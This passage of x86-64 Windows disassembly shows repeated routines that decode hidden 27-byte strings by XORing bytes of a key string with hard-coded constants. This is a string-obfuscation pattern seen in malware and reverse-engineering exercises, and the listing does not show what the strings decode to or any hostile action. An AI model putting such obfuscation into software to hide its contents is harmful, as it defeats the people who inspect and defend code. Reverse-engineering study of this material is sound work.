   140002bd4:	41 88 40 19          	mov    %al,0x19(%r8)
   140002bd8:	4c 8b c3             	mov    %rbx,%r8
   140002bdb:	48 83 3d 5d 43 02 00 	cmpq   $0xf,0x2435d(%rip)        # 0x140026f40
   140002be2:	0f 
   140002be3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002be8:	4c 0f 47 05 38 43 02 	cmova  0x24338(%rip),%r8        # 0x140026f28
   140002bef:	00 
   140002bf0:	33 d2                	xor    %edx,%edx
   140002bf2:	48 f7 f1             	div    %rcx
   140002bf5:	48 8b c3             	mov    %rbx,%rax
   140002bf8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140002bfd:	80 f1 65             	xor    $0x65,%cl
   140002c00:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140002c04:	48 83 c4 30          	add    $0x30,%rsp
   140002c08:	5b                   	pop    %rbx
   140002c09:	c3                   	ret
   140002c0a:	cc                   	int3
   140002c0b:	cc                   	int3
   140002c0c:	cc                   	int3
   140002c0d:	cc                   	int3
   140002c0e:	cc                   	int3
   140002c0f:	cc                   	int3
   140002c10:	40 53                	rex push %rbx
   140002c12:	48 83 ec 30          	sub    $0x30,%rsp
   140002c16:	48 8d 1d 0b 42 02 00 	lea    0x2420b(%rip),%rbx        # 0x140026e28
   140002c1d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140002c22:	48 8b cb             	mov    %rbx,%rcx
   140002c25:	e8 e6 36 00 00       	call   0x140006310
   140002c2a:	4c 8d 0d 97 bc 00 00 	lea    0xbc97(%rip),%r9        # 0x14000e8c8
   140002c31:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002c38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002c3f:	00 
   140002c40:	48 ff c1             	inc    %rcx
   140002c43:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140002c48:	75 f6                	jne    0x140002c40
   140002c4a:	48 83 3d ee 41 02 00 	cmpq   $0xf,0x241ee(%rip)        # 0x140026e40
   140002c51:	0f 
   140002c52:	48 8b c3             	mov    %rbx,%rax
   140002c55:	4c 8b c3             	mov    %rbx,%r8
   140002c58:	48 0f 47 05 c8 41 02 	cmova  0x241c8(%rip),%rax        # 0x140026e28
   140002c5f:	00 
   140002c60:	c6 00 25             	movb   $0x25,(%rax)
   140002c63:	b8 01 00 00 00       	mov    $0x1,%eax
   140002c68:	48 83 3d d0 41 02 00 	cmpq   $0xf,0x241d0(%rip)        # 0x140026e40
   140002c6f:	0f 
   140002c70:	4c 0f 47 05 b0 41 02 	cmova  0x241b0(%rip),%r8        # 0x140026e28
   140002c77:	00 
   140002c78:	33 d2                	xor    %edx,%edx
   140002c7a:	48 f7 f1             	div    %rcx
   140002c7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002c82:	34 3a                	xor    $0x3a,%al
   140002c84:	41 88 40 01          	mov    %al,0x1(%r8)
   140002c88:	4c 8b c3             	mov    %rbx,%r8
   140002c8b:	48 83 3d ad 41 02 00 	cmpq   $0xf,0x241ad(%rip)        # 0x140026e40
   140002c92:	0f 
   140002c93:	b8 02 00 00 00       	mov    $0x2,%eax
   140002c98:	4c 0f 47 05 88 41 02 	cmova  0x24188(%rip),%r8        # 0x140026e28
   140002c9f:	00 
   140002ca0:	33 d2                	xor    %edx,%edx
   140002ca2:	48 f7 f1             	div    %rcx
   140002ca5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002caa:	34 5c                	xor    $0x5c,%al
   140002cac:	41 88 40 02          	mov    %al,0x2(%r8)
   140002cb0:	4c 8b c3             	mov    %rbx,%r8
   140002cb3:	48 83 3d 85 41 02 00 	cmpq   $0xf,0x24185(%rip)        # 0x140026e40
   140002cba:	0f 
   140002cbb:	b8 03 00 00 00       	mov    $0x3,%eax
   140002cc0:	4c 0f 47 05 60 41 02 	cmova  0x24160(%rip),%r8        # 0x140026e28
   140002cc7:	00 
   140002cc8:	33 d2                	xor    %edx,%edx
   140002cca:	48 f7 f1             	div    %rcx
   140002ccd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002cd2:	34 57                	xor    $0x57,%al
   140002cd4:	41 88 40 03          	mov    %al,0x3(%r8)
   140002cd8:	4c 8b c3             	mov    %rbx,%r8
   140002cdb:	48 83 3d 5d 41 02 00 	cmpq   $0xf,0x2415d(%rip)        # 0x140026e40
   140002ce2:	0f 
   140002ce3:	b8 04 00 00 00       	mov    $0x4,%eax
   140002ce8:	4c 0f 47 05 38 41 02 	cmova  0x24138(%rip),%r8        # 0x140026e28
   140002cef:	00 
   140002cf0:	33 d2                	xor    %edx,%edx
   140002cf2:	48 f7 f1             	div    %rcx
   140002cf5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002cfa:	34 69                	xor    $0x69,%al
   140002cfc:	41 88 40 04          	mov    %al,0x4(%r8)
   140002d00:	4c 8b c3             	mov    %rbx,%r8
   140002d03:	48 83 3d 35 41 02 00 	cmpq   $0xf,0x24135(%rip)        # 0x140026e40
   140002d0a:	0f 
   140002d0b:	b8 05 00 00 00       	mov    $0x5,%eax
   140002d10:	4c 0f 47 05 10 41 02 	cmova  0x24110(%rip),%r8        # 0x140026e28
   140002d17:	00 
   140002d18:	33 d2                	xor    %edx,%edx
   140002d1a:	48 f7 f1             	div    %rcx
   140002d1d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d22:	34 6e                	xor    $0x6e,%al
   140002d24:	41 88 40 05          	mov    %al,0x5(%r8)
   140002d28:	4c 8b c3             	mov    %rbx,%r8
   140002d2b:	48 83 3d 0d 41 02 00 	cmpq   $0xf,0x2410d(%rip)        # 0x140026e40
   140002d32:	0f 
   140002d33:	b8 06 00 00 00       	mov    $0x6,%eax
   140002d38:	4c 0f 47 05 e8 40 02 	cmova  0x240e8(%rip),%r8        # 0x140026e28
   140002d3f:	00 
   140002d40:	33 d2                	xor    %edx,%edx
   140002d42:	48 f7 f1             	div    %rcx
   140002d45:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d4a:	34 64                	xor    $0x64,%al
   140002d4c:	41 88 40 06          	mov    %al,0x6(%r8)
   140002d50:	4c 8b c3             	mov    %rbx,%r8
   140002d53:	48 83 3d e5 40 02 00 	cmpq   $0xf,0x240e5(%rip)        # 0x140026e40
   140002d5a:	0f 
   140002d5b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002d60:	4c 0f 47 05 c0 40 02 	cmova  0x240c0(%rip),%r8        # 0x140026e28
   140002d67:	00 
   140002d68:	33 d2                	xor    %edx,%edx
   140002d6a:	48 f7 f1             	div    %rcx
   140002d6d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d72:	34 6f                	xor    $0x6f,%al
   140002d74:	41 88 40 07          	mov    %al,0x7(%r8)
   140002d78:	4c 8b c3             	mov    %rbx,%r8
   140002d7b:	48 83 3d bd 40 02 00 	cmpq   $0xf,0x240bd(%rip)        # 0x140026e40
   140002d82:	0f 
   140002d83:	b8 08 00 00 00       	mov    $0x8,%eax
   140002d88:	4c 0f 47 05 98 40 02 	cmova  0x24098(%rip),%r8        # 0x140026e28
   140002d8f:	00 
   140002d90:	33 d2                	xor    %edx,%edx
   140002d92:	48 f7 f1             	div    %rcx
   140002d95:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d9a:	34 77                	xor    $0x77,%al
   140002d9c:	41 88 40 08          	mov    %al,0x8(%r8)
   140002da0:	4c 8b c3             	mov    %rbx,%r8
   140002da3:	48 83 3d 95 40 02 00 	cmpq   $0xf,0x24095(%rip)        # 0x140026e40
   140002daa:	0f 
   140002dab:	b8 09 00 00 00       	mov    $0x9,%eax
   140002db0:	4c 0f 47 05 70 40 02 	cmova  0x24070(%rip),%r8        # 0x140026e28
   140002db7:	00 
   140002db8:	33 d2                	xor    %edx,%edx
   140002dba:	48 f7 f1             	div    %rcx
   140002dbd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002dc2:	34 73                	xor    $0x73,%al
   140002dc4:	41 88 40 09          	mov    %al,0x9(%r8)
   140002dc8:	4c 8b c3             	mov    %rbx,%r8
   140002dcb:	48 83 3d 6d 40 02 00 	cmpq   $0xf,0x2406d(%rip)        # 0x140026e40
   140002dd2:	0f 
   140002dd3:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002dd8:	4c 0f 47 05 48 40 02 	cmova  0x24048(%rip),%r8        # 0x140026e28
   140002ddf:	00 
   140002de0:	33 d2                	xor    %edx,%edx
   140002de2:	48 f7 f1             	div    %rcx
   140002de5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002dea:	34 5c                	xor    $0x5c,%al
   140002dec:	41 88 40 0a          	mov    %al,0xa(%r8)
   140002df0:	4c 8b c3             	mov    %rbx,%r8
   140002df3:	48 83 3d 45 40 02 00 	cmpq   $0xf,0x24045(%rip)        # 0x140026e40
   140002dfa:	0f 
   140002dfb:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002e00:	4c 0f 47 05 20 40 02 	cmova  0x24020(%rip),%r8        # 0x140026e28
   140002e07:	00 
   140002e08:	33 d2                	xor    %edx,%edx
   140002e0a:	48 f7 f1             	div    %rcx
   140002e0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002e12:	34 54                	xor    $0x54,%al
   140002e14:	41 88 40 0b          	mov    %al,0xb(%r8)
   140002e18:	4c 8b c3             	mov    %rbx,%r8
   140002e1b:	48 83 3d 1d 40 02 00 	cmpq   $0xf,0x2401d(%rip)        # 0x140026e40
   140002e22:	0f 
   140002e23:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002e28:	4c 0f 47 05 f8 3f 02 	cmova  0x23ff8(%rip),%r8        # 0x140026e28
   140002e2f:	00 
   140002e30:	33 d2                	xor    %edx,%edx
   140002e32:	48 f7 f1             	div    %rcx
   140002e35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002e3a:	34 45                	xor    $0x45,%al
   140002e3c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140002e40:	4c 8b c3             	mov    %rbx,%r8
   140002e43:	48 83 3d f5 3f 02 00 	cmpq   $0xf,0x23ff5(%rip)        # 0x140026e40
   140002e4a:	0f 
   140002e4b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002e50:	4c 0f 47 05 d0 3f 02 	cmova  0x23fd0(%rip),%r8        # 0x140026e28
   140002e57:	00 
   140002e58:	33 d2                	xor    %edx,%edx
   140002e5a:	48 f7 f1             	div    %rcx
   140002e5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002e62:	34 4d                	xor    $0x4d,%al
   140002e64:	41 88 40 0d          	mov    %al,0xd(%r8)
   140002e68:	4c 8b c3             	mov    %rbx,%r8
   140002e6b:	48 83 3d cd 3f 02 00 	cmpq   $0xf,0x23fcd(%rip)        # 0x140026e40
   140002e72:	0f 
   140002e73:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002e78:	4c 0f 47 05 a8 3f 02 	cmova  0x23fa8(%rip),%r8        # 0x140026e28
   140002e7f:	00 
   140002e80:	33 d2                	xor    %edx,%edx
   140002e82:	48 f7 f1             	div    %rcx
   140002e85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002e8a:	34 50                	xor    $0x50,%al
   140002e8c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140002e90:	4c 8b c3             	mov    %rbx,%r8
   140002e93:	48 83 3d a5 3f 02 00 	cmpq   $0xf,0x23fa5(%rip)        # 0x140026e40
   140002e9a:	0f 
   140002e9b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002ea0:	4c 0f 47 05 80 3f 02 	cmova  0x23f80(%rip),%r8        # 0x140026e28
   140002ea7:	00 
   140002ea8:	33 d2                	xor    %edx,%edx
   140002eaa:	48 f7 f1             	div    %rcx
   140002ead:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002eb2:	34 5c                	xor    $0x5c,%al
   140002eb4:	41 88 40 0f          	mov    %al,0xf(%r8)
   140002eb8:	4c 8b c3             	mov    %rbx,%r8
   140002ebb:	48 83 3d 7d 3f 02 00 	cmpq   $0xf,0x23f7d(%rip)        # 0x140026e40
   140002ec2:	0f 
   140002ec3:	b8 10 00 00 00       	mov    $0x10,%eax
   140002ec8:	4c 0f 47 05 58 3f 02 	cmova  0x23f58(%rip),%r8        # 0x140026e28
   140002ecf:	00 
   140002ed0:	33 d2                	xor    %edx,%edx
   140002ed2:	48 f7 f1             	div    %rcx
   140002ed5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002eda:	34 67                	xor    $0x67,%al
   140002edc:	41 88 40 10          	mov    %al,0x10(%r8)
   140002ee0:	4c 8b c3             	mov    %rbx,%r8
   140002ee3:	48 83 3d 55 3f 02 00 	cmpq   $0xf,0x23f55(%rip)        # 0x140026e40
   140002eea:	0f 
   140002eeb:	b8 11 00 00 00       	mov    $0x11,%eax
   140002ef0:	4c 0f 47 05 30 3f 02 	cmova  0x23f30(%rip),%r8        # 0x140026e28
   140002ef7:	00 
   140002ef8:	33 d2                	xor    %edx,%edx
   140002efa:	48 f7 f1             	div    %rcx
   140002efd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f02:	34 69                	xor    $0x69,%al
   140002f04:	41 88 40 11          	mov    %al,0x11(%r8)
   140002f08:	4c 8b c3             	mov    %rbx,%r8
   140002f0b:	48 83 3d 2d 3f 02 00 	cmpq   $0xf,0x23f2d(%rip)        # 0x140026e40
   140002f12:	0f 
   140002f13:	b8 12 00 00 00       	mov    $0x12,%eax
   140002f18:	4c 0f 47 05 08 3f 02 	cmova  0x23f08(%rip),%r8        # 0x140026e28
   140002f1f:	00 
   140002f20:	33 d2                	xor    %edx,%edx
   140002f22:	48 f7 f1             	div    %rcx
   140002f25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f2a:	34 61                	xor    $0x61,%al
   140002f2c:	41 88 40 12          	mov    %al,0x12(%r8)
   140002f30:	4c 8b c3             	mov    %rbx,%r8
   140002f33:	48 83 3d 05 3f 02 00 	cmpq   $0xf,0x23f05(%rip)        # 0x140026e40
   140002f3a:	0f 
   140002f3b:	b8 13 00 00 00       	mov    $0x13,%eax
   140002f40:	4c 0f 47 05 e0 3e 02 	cmova  0x23ee0(%rip),%r8        # 0x140026e28
   140002f47:	00 
   140002f48:	33 d2                	xor    %edx,%edx
   140002f4a:	48 f7 f1             	div    %rcx
   140002f4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f52:	34 6e                	xor    $0x6e,%al
   140002f54:	41 88 40 13          	mov    %al,0x13(%r8)
   140002f58:	4c 8b c3             	mov    %rbx,%r8
   140002f5b:	48 83 3d dd 3e 02 00 	cmpq   $0xf,0x23edd(%rip)        # 0x140026e40
   140002f62:	0f 
   140002f63:	b8 14 00 00 00       	mov    $0x14,%eax
   140002f68:	4c 0f 47 05 b8 3e 02 	cmova  0x23eb8(%rip),%r8        # 0x140026e28
   140002f6f:	00 
   140002f70:	33 d2                	xor    %edx,%edx
   140002f72:	48 f7 f1             	div    %rcx
   140002f75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f7a:	34 6e                	xor    $0x6e,%al
   140002f7c:	41 88 40 14          	mov    %al,0x14(%r8)
   140002f80:	4c 8b c3             	mov    %rbx,%r8
   140002f83:	48 83 3d b5 3e 02 00 	cmpq   $0xf,0x23eb5(%rip)        # 0x140026e40
   140002f8a:	0f 
   140002f8b:	b8 15 00 00 00       	mov    $0x15,%eax
   140002f90:	4c 0f 47 05 90 3e 02 	cmova  0x23e90(%rip),%r8        # 0x140026e28
   140002f97:	00 
   140002f98:	33 d2                	xor    %edx,%edx
   140002f9a:	48 f7 f1             	div    %rcx
   140002f9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002fa2:	34 69                	xor    $0x69,%al
   140002fa4:	41 88 40 15          	mov    %al,0x15(%r8)
   140002fa8:	4c 8b c3             	mov    %rbx,%r8
   140002fab:	48 83 3d 8d 3e 02 00 	cmpq   $0xf,0x23e8d(%rip)        # 0x140026e40
   140002fb2:	0f 
   140002fb3:	b8 16 00 00 00       	mov    $0x16,%eax
   140002fb8:	4c 0f 47 05 68 3e 02 	cmova  0x23e68(%rip),%r8        # 0x140026e28
   140002fbf:	00 
   140002fc0:	33 d2                	xor    %edx,%edx
   140002fc2:	48 f7 f1             	div    %rcx
   140002fc5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002fca:	34 35                	xor    $0x35,%al
   140002fcc:	41 88 40 16          	mov    %al,0x16(%r8)
   140002fd0:	4c 8b c3             	mov    %rbx,%r8
   140002fd3:	48 83 3d 65 3e 02 00 	cmpq   $0xf,0x23e65(%rip)        # 0x140026e40
   140002fda:	0f 
   140002fdb:	b8 17 00 00 00       	mov    $0x17,%eax
   140002fe0:	4c 0f 47 05 40 3e 02 	cmova  0x23e40(%rip),%r8        # 0x140026e28
   140002fe7:	00 
   140002fe8:	33 d2                	xor    %edx,%edx
   140002fea:	48 f7 f1             	div    %rcx
   140002fed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002ff2:	34 2e                	xor    $0x2e,%al
   140002ff4:	41 88 40 17          	mov    %al,0x17(%r8)
   140002ff8:	4c 8b c3             	mov    %rbx,%r8
   140002ffb:	48 83 3d 3d 3e 02 00 	cmpq   $0xf,0x23e3d(%rip)        # 0x140026e40
   140003002:	0f 
   140003003:	b8 18 00 00 00       	mov    $0x18,%eax
   140003008:	4c 0f 47 05 18 3e 02 	cmova  0x23e18(%rip),%r8        # 0x140026e28
   14000300f:	00 
   140003010:	33 d2                	xor    %edx,%edx
   140003012:	48 f7 f1             	div    %rcx
   140003015:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000301a:	34 65                	xor    $0x65,%al
   14000301c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003020:	4c 8b c3             	mov    %rbx,%r8
   140003023:	48 83 3d 15 3e 02 00 	cmpq   $0xf,0x23e15(%rip)        # 0x140026e40
   14000302a:	0f 
   14000302b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003030:	4c 0f 47 05 f0 3d 02 	cmova  0x23df0(%rip),%r8        # 0x140026e28
   140003037:	00 
   140003038:	33 d2                	xor    %edx,%edx
   14000303a:	48 f7 f1             	div    %rcx
   14000303d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003042:	34 78                	xor    $0x78,%al
   140003044:	41 88 40 19          	mov    %al,0x19(%r8)
   140003048:	4c 8b c3             	mov    %rbx,%r8
   14000304b:	48 83 3d ed 3d 02 00 	cmpq   $0xf,0x23ded(%rip)        # 0x140026e40
   140003052:	0f 
   140003053:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003058:	4c 0f 47 05 c8 3d 02 	cmova  0x23dc8(%rip),%r8        # 0x140026e28
   14000305f:	00 
   140003060:	33 d2                	xor    %edx,%edx
   140003062:	48 f7 f1             	div    %rcx
   140003065:	48 8b c3             	mov    %rbx,%rax
   140003068:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000306d:	80 f1 65             	xor    $0x65,%cl
   140003070:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003074:	48 83 c4 30          	add    $0x30,%rsp
   140003078:	5b                   	pop    %rbx
   140003079:	c3                   	ret
   14000307a:	cc                   	int3
   14000307b:	cc                   	int3
   14000307c:	cc                   	int3
   14000307d:	cc                   	int3
   14000307e:	cc                   	int3
   14000307f:	cc                   	int3
   140003080:	40 53                	rex push %rbx
   140003082:	48 83 ec 30          	sub    $0x30,%rsp
   140003086:	48 8d 1d 5b 3e 02 00 	lea    0x23e5b(%rip),%rbx        # 0x140026ee8
   14000308d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140003092:	48 8b cb             	mov    %rbx,%rcx
   140003095:	e8 76 32 00 00       	call   0x140006310
   14000309a:	4c 8d 0d 1f b8 00 00 	lea    0xb81f(%rip),%r9        # 0x14000e8c0
   1400030a1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400030a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030af:	00 
   1400030b0:	48 ff c1             	inc    %rcx
   1400030b3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400030b8:	75 f6                	jne    0x1400030b0
   1400030ba:	48 83 3d 3e 3e 02 00 	cmpq   $0xf,0x23e3e(%rip)        # 0x140026f00
   1400030c1:	0f 
   1400030c2:	48 8b c3             	mov    %rbx,%rax
   1400030c5:	4c 8b c3             	mov    %rbx,%r8
   1400030c8:	48 0f 47 05 18 3e 02 	cmova  0x23e18(%rip),%rax        # 0x140026ee8
   1400030cf:	00 
   1400030d0:	c6 00 2c             	movb   $0x2c,(%rax)
   1400030d3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400030d8:	48 83 3d 20 3e 02 00 	cmpq   $0xf,0x23e20(%rip)        # 0x140026f00
   1400030df:	0f 
   1400030e0:	4c 0f 47 05 00 3e 02 	cmova  0x23e00(%rip),%r8        # 0x140026ee8
   1400030e7:	00 
   1400030e8:	33 d2                	xor    %edx,%edx
   1400030ea:	48 f7 f1             	div    %rcx
   1400030ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400030f2:	34 3a                	xor    $0x3a,%al
   1400030f4:	41 88 40 01          	mov    %al,0x1(%r8)
   1400030f8:	4c 8b c3             	mov    %rbx,%r8
   1400030fb:	48 83 3d fd 3d 02 00 	cmpq   $0xf,0x23dfd(%rip)        # 0x140026f00
   140003102:	0f 
   140003103:	b8 02 00 00 00       	mov    $0x2,%eax
   140003108:	4c 0f 47 05 d8 3d 02 	cmova  0x23dd8(%rip),%r8        # 0x140026ee8
   14000310f:	00 
   140003110:	33 d2                	xor    %edx,%edx
   140003112:	48 f7 f1             	div    %rcx
   140003115:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000311a:	34 5c                	xor    $0x5c,%al
   14000311c:	41 88 40 02          	mov    %al,0x2(%r8)
   140003120:	4c 8b c3             	mov    %rbx,%r8
   140003123:	48 83 3d d5 3d 02 00 	cmpq   $0xf,0x23dd5(%rip)        # 0x140026f00
   14000312a:	0f 
   14000312b:	b8 03 00 00 00       	mov    $0x3,%eax
   140003130:	4c 0f 47 05 b0 3d 02 	cmova  0x23db0(%rip),%r8        # 0x140026ee8
   140003137:	00 
   140003138:	33 d2                	xor    %edx,%edx
   14000313a:	48 f7 f1             	div    %rcx
   14000313d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003142:	34 57                	xor    $0x57,%al
   140003144:	41 88 40 03          	mov    %al,0x3(%r8)
   140003148:	4c 8b c3             	mov    %rbx,%r8
   14000314b:	48 83 3d ad 3d 02 00 	cmpq   $0xf,0x23dad(%rip)        # 0x140026f00
   140003152:	0f 
   140003153:	b8 04 00 00 00       	mov    $0x4,%eax
   140003158:	4c 0f 47 05 88 3d 02 	cmova  0x23d88(%rip),%r8        # 0x140026ee8
   14000315f:	00 
   140003160:	33 d2                	xor    %edx,%edx
   140003162:	48 f7 f1             	div    %rcx
   140003165:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000316a:	34 69                	xor    $0x69,%al
   14000316c:	41 88 40 04          	mov    %al,0x4(%r8)
   140003170:	4c 8b c3             	mov    %rbx,%r8
   140003173:	48 83 3d 85 3d 02 00 	cmpq   $0xf,0x23d85(%rip)        # 0x140026f00
   14000317a:	0f 
   14000317b:	b8 05 00 00 00       	mov    $0x5,%eax
   140003180:	4c 0f 47 05 60 3d 02 	cmova  0x23d60(%rip),%r8        # 0x140026ee8
   140003187:	00 
   140003188:	33 d2                	xor    %edx,%edx
   14000318a:	48 f7 f1             	div    %rcx
   14000318d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003192:	34 6e                	xor    $0x6e,%al
   140003194:	41 88 40 05          	mov    %al,0x5(%r8)
   140003198:	4c 8b c3             	mov    %rbx,%r8
   14000319b:	48 83 3d 5d 3d 02 00 	cmpq   $0xf,0x23d5d(%rip)        # 0x140026f00
   1400031a2:	0f 
   1400031a3:	b8 06 00 00 00       	mov    $0x6,%eax
   1400031a8:	4c 0f 47 05 38 3d 02 	cmova  0x23d38(%rip),%r8        # 0x140026ee8
   1400031af:	00 
   1400031b0:	33 d2                	xor    %edx,%edx
   1400031b2:	48 f7 f1             	div    %rcx
   1400031b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400031ba:	34 64                	xor    $0x64,%al
   1400031bc:	41 88 40 06          	mov    %al,0x6(%r8)
   1400031c0:	4c 8b c3             	mov    %rbx,%r8
   1400031c3:	48 83 3d 35 3d 02 00 	cmpq   $0xf,0x23d35(%rip)        # 0x140026f00
   1400031ca:	0f 
   1400031cb:	b8 07 00 00 00       	mov    $0x7,%eax
   1400031d0:	4c 0f 47 05 10 3d 02 	cmova  0x23d10(%rip),%r8        # 0x140026ee8
   1400031d7:	00 
   1400031d8:	33 d2                	xor    %edx,%edx
   1400031da:	48 f7 f1             	div    %rcx
   1400031dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400031e2:	34 6f                	xor    $0x6f,%al
   1400031e4:	41 88 40 07          	mov    %al,0x7(%r8)
   1400031e8:	4c 8b c3             	mov    %rbx,%r8
   1400031eb:	48 83 3d 0d 3d 02 00 	cmpq   $0xf,0x23d0d(%rip)        # 0x140026f00
   1400031f2:	0f 
   1400031f3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400031f8:	4c 0f 47 05 e8 3c 02 	cmova  0x23ce8(%rip),%r8        # 0x140026ee8
   1400031ff:	00 
   140003200:	33 d2                	xor    %edx,%edx
   140003202:	48 f7 f1             	div    %rcx
   140003205:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000320a:	34 77                	xor    $0x77,%al
   14000320c:	41 88 40 08          	mov    %al,0x8(%r8)
   140003210:	4c 8b c3             	mov    %rbx,%r8
   140003213:	48 83 3d e5 3c 02 00 	cmpq   $0xf,0x23ce5(%rip)        # 0x140026f00
   14000321a:	0f 
   14000321b:	b8 09 00 00 00       	mov    $0x9,%eax
   140003220:	4c 0f 47 05 c0 3c 02 	cmova  0x23cc0(%rip),%r8        # 0x140026ee8
   140003227:	00 
   140003228:	33 d2                	xor    %edx,%edx
   14000322a:	48 f7 f1             	div    %rcx
   14000322d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003232:	34 73                	xor    $0x73,%al
   140003234:	41 88 40 09          	mov    %al,0x9(%r8)
   140003238:	4c 8b c3             	mov    %rbx,%r8
   14000323b:	48 83 3d bd 3c 02 00 	cmpq   $0xf,0x23cbd(%rip)        # 0x140026f00
   140003242:	0f 
   140003243:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003248:	4c 0f 47 05 98 3c 02 	cmova  0x23c98(%rip),%r8        # 0x140026ee8
   14000324f:	00 
   140003250:	33 d2                	xor    %edx,%edx
   140003252:	48 f7 f1             	div    %rcx
   140003255:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000325a:	34 5c                	xor    $0x5c,%al
   14000325c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140003260:	4c 8b c3             	mov    %rbx,%r8
   140003263:	48 83 3d 95 3c 02 00 	cmpq   $0xf,0x23c95(%rip)        # 0x140026f00
   14000326a:	0f 
   14000326b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003270:	4c 0f 47 05 70 3c 02 	cmova  0x23c70(%rip),%r8        # 0x140026ee8
   140003277:	00 
   140003278:	33 d2                	xor    %edx,%edx
   14000327a:	48 f7 f1             	div    %rcx
   14000327d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003282:	34 54                	xor    $0x54,%al
   140003284:	41 88 40 0b          	mov    %al,0xb(%r8)
   140003288:	4c 8b c3             	mov    %rbx,%r8
   14000328b:	48 83 3d 6d 3c 02 00 	cmpq   $0xf,0x23c6d(%rip)        # 0x140026f00
   140003292:	0f 
   140003293:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003298:	4c 0f 47 05 48 3c 02 	cmova  0x23c48(%rip),%r8        # 0x140026ee8
   14000329f:	00 
   1400032a0:	33 d2                	xor    %edx,%edx
   1400032a2:	48 f7 f1             	div    %rcx
   1400032a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400032aa:	34 45                	xor    $0x45,%al
   1400032ac:	41 88 40 0c          	mov    %al,0xc(%r8)
   1400032b0:	4c 8b c3             	mov    %rbx,%r8
   1400032b3:	48 83 3d 45 3c 02 00 	cmpq   $0xf,0x23c45(%rip)        # 0x140026f00
   1400032ba:	0f 
   1400032bb:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400032c0:	4c 0f 47 05 20 3c 02 	cmova  0x23c20(%rip),%r8        # 0x140026ee8
   1400032c7:	00 
   1400032c8:	33 d2                	xor    %edx,%edx
   1400032ca:	48 f7 f1             	div    %rcx
   1400032cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400032d2:	34 4d                	xor    $0x4d,%al
   1400032d4:	41 88 40 0d          	mov    %al,0xd(%r8)
   1400032d8:	4c 8b c3             	mov    %rbx,%r8
